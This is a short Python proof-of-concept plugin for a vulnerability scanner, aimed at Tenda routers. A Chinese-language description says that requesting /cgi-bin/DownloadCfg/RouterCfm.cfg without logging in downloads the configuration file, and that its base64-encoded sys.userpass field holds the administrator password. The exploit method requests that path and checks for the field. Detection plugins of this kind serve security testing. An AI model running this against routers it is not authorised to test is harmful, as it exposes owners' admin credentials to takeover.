from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.high
        self.detail = """访问`/cgi-bin/DownloadCfg/RouterCfm.cfg`可以下载路由器配置文件，其中`sys.userpass`在base64解码之后就是管理员密码"""
        self.name = "腾达路由器密码泄露"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "Tenda | Login" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        client = Http()
        client.url = urljoin(self.target, "/cgi-bin/DownloadCfg/RouterCfm.cfg")
        resp = client.get()
        if "sys.userpass" in resp.text:
            return True
        else:
            return False
